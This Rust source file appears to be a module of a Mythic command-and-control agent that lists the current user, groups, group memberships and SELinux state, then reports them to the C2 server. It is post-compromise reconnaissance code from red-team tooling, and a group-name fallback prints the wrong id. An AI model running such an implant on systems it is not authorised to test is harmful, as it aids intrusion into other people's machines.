use std::io::{BufRead, Read};

use crate::{
    agent::AgentTask,
    mythic_success,
    utils::{os::unix::GroupEntry, platform},
};

/// Get the privileges of the current process
/// Retrieves the following information:
/// - User: username(uid)
/// - Group: groupname(gid)
/// - GroupMemberships: groupname(gid)
///
/// Arguments:
/// * `task` - Tasking information
pub fn get_privileges(task: &AgentTask) -> Result<serde_json::Value, Box<dyn std::error::Error>> {
    // Get the current user
    let mut user = platform::username()?;

    // Start formulating the response output
    let mut output = format!("Privileges for '{user}' on '{}'\n\n", platform::hostname()?);

    // Grab the current uid
    let uid = unsafe { libc::getuid() };
    output.push_str(format!("User: {user}({uid})\n").as_str());

    // Grab the current gid
    let gid = unsafe { libc::getgid() };
    output.push_str(
        format!(
            "Group: {}({})\n\n",
            GroupEntry::getgrgid(gid)
                .and_then(
                    |entry| entry.ok_or_else(|| std::io::Error::from_raw_os_error(libc::ENOENT))
                )
                .map(|entry| entry.name().to_string_lossy().to_string())
                .unwrap_or_else(|_| gid.to_string()),
            gid
        )
        .as_str(),
    );

    user.push('\0');

    // Get the other group information associated with this callback
    let mut ngroups = 0;
    unsafe {
        libc::getgrouplist(
            user.as_ptr().cast(),
            gid,
            std::ptr::null_mut(),
            &mut ngroups,
        )
    };

    // Check if the `grouplist` libc call returned more than 0 groups
    if ngroups > 0 {
        output.push_str("Group Memberships:\n");

        // Create a buffer to hold the group information
        let mut groups = vec![0; ngroups.try_into().unwrap_or(32)];

        // Query `getgrouplist` again to get the group information
        if unsafe {
            libc::getgrouplist(user.as_ptr().cast(), gid, groups.as_mut_ptr(), &mut ngroups)
        } >= 0
        {
            // Iterate over each group appending the information to the output
            for group in groups {
                output.push_str(
                    format!(
                        "{}({})\n",
                        GroupEntry::getgrgid(group)
                            .and_then(|entry| entry
                                .ok_or_else(|| std::io::Error::from_raw_os_error(libc::ENOENT)))
                            .map(|entry| entry.name().to_string_lossy().to_string())
                            .unwrap_or_else(|_| gid.to_string()),
                        group
                    )
                    .as_str(),
                );
            }
        }
    }

    // Check if the agent is on an SELinux kernel
    if std::fs::exists("/sys/fs/selinux").is_ok_and(|b| b) {
        output.push_str("\nSELinux:\n");

        output.push_str("status: Enabled\n");

        // Grab the SELinux enforcing information
        if let Ok(mut f) = std::fs::File::open("/sys/fs/selinux/enforce") {
            let mut mode = String::new();
            let _ = f.read_to_string(&mut mode);

            match mode.parse::<i32>() {
                Ok(0) => output.push_str("enforce: Permissive\n"),
                Ok(1) => output.push_str("enforce: Enforcing\n"),
                _ => output.push_str("enforce: unknown\n"),
            }
        } else {
            output.push_str("enforce: unknown\n");
        }

        // Grab the SELinux policy
        if let Ok(f) = std::fs::File::open("/etc/selinux/config") {
            let reader = std::io::BufReader::new(f);
            for line in reader.lines().map_while(Result::ok) {
                if line.starts_with("SELINUXTYPE=") {
                    let policy = line.split('=').next_back().unwrap();
                    output.push_str(format!("policy: {}\n", policy).as_str());
                }
            }
        } else {
            output.push_str("policy: unknown\n");
        }

        // Grab the current SELinux context for the agent
        if let Ok(mut context) = std::fs::read_to_string("/proc/thread-self/attr/current") {
            context.pop().unwrap();
            output.push_str(format!("user context: {}\n", context).as_str());
        }
    }

    output = output.trim_end_matches('\n').to_string();

    // Send the output to Mythic
    Ok(mythic_success!(task.id, output))
}
